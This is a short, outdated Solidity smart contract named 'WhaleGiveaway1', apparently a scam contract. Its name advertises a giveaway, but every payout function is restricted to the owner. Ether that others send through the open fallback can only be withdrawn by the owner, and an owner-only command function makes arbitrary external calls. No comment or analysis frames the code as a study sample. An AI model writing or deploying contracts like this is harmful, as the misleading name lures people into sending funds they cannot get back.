pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
address public owner = msg.sender;

function() public payable {}

function getFreebie() public payable onlyOwner {
require(msg.value > 0 && msg.value <= this.balance);
msg.sender.transfer(msg.value);
}

function withdraw() public payable onlyOwner {
owner.transfer(this.balance);
}

function command(address adr, bytes data) public payable onlyOwner {
require(adr != address(0));
require(msg.value > 0 && msg.value <= this.balance);
adr.call.value(msg.value)(data);
}

modifier onlyOwner() {
require(msg.sender == owner);
_;
}
}